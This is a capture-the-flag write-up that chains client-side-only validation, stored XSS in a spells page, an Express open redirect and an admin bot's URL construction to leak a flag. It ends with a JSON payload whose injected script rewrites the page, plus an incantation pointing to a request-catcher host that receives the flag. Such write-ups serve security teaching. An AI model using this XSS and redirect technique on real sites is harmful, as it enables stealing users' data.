1. Register an account, go to spells page.
2. Spell type is only validated client-side and its rendering in spells.ejs is vulnerable to XSS. It is not enough to get the flag though, as the auth cookie is HttpOnly.
3. Notice a comment in magic.js on index page (Let the magic happen) has weird location response. If you look at package.json you will notice a hardcoded express library. One of the first vulnerabilities when you look it up is open redirect. [Sample exploitation](https://www.herodevs.com/vulnerability-directory/cve-2024-9266). Our index page is similar to this.
4. Look what happens when you "Share" last spell. Our bot visits `/<magician_name>/spells`, extracts the magician's name from the header and the last spell incantation and forms a path to visit:
`http://app:3000/${magicianName}/?spell=./${spell.incantation}/${CONFIG.APPFLAG}`.
5. Magician's name must be alphanumeric, non-empty value when registering. It is also validated when sending the "Share", however you can use XSS to change the header with magician's name to empty. This will make the URL `http://app:3000//?spell=./${spell.incantation/}/${CONFIG.APPFLAG}`. Now, it is enough to set the incantation to some URL request catcher and retrieve the flag.

Sample payload for new spell (`POST /spells`):
```
{
    "incantation":"some.requestcatcher.com/",
    "spell_type":"</td></tr></tbody></table><script>const span = document.querySelector('span.magician');span.textContent='';</script>"
}
```

After that just share the last spell and wait for the request from the bot.